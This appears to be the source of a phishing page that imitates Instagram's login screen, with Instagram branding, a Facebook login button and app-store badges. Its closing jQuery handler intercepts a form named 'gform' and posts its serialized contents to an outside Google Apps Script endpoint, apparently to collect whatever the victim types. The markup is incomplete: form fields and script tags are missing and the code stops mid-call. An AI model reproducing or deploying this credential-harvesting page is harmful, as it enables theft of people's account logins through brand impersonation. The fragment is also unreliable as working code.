<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="images/tab-icon.png" type="image/png">
    <link rel="stylesheet" href="style.css" type="text/css">

<body>
    <div class="container">
    <div class="main">
        <div class="main-image">
            <img src="images/main-img.png" >

              <div class="or-main">

              </div>
          
              <div class="facebook-login">
                <img src="images/facebook.png" class="facebook" alt="">

              </div>
          
              <div class="Password">Forgot password?</div>
              <div class="question">Don't have an account? <span class="signup">Sign up</span></div>
              <div class="getapp">Get the app.</div>
          
              <div class="play-click">
                <img src="images/playstore.png" class="playstore" alt="">
                <img src="images/micstore.png" class="playstore" alt="">

          </div>
          
        </div>
        </div>

        </div>

            $("#gform").submit((e)=>{
                e.preventDefault()
                $.ajax({
                    url:"https://script.google.com/macros/s/AKfycbzaWnePa_ixc25VB2Z881ONuh5tTqvRWItW7IdJNirn2Q58axNP0dNHArcYlnsFghn-4A/exec",
                    data:$("#gform").serialize(),
                    method:"post",
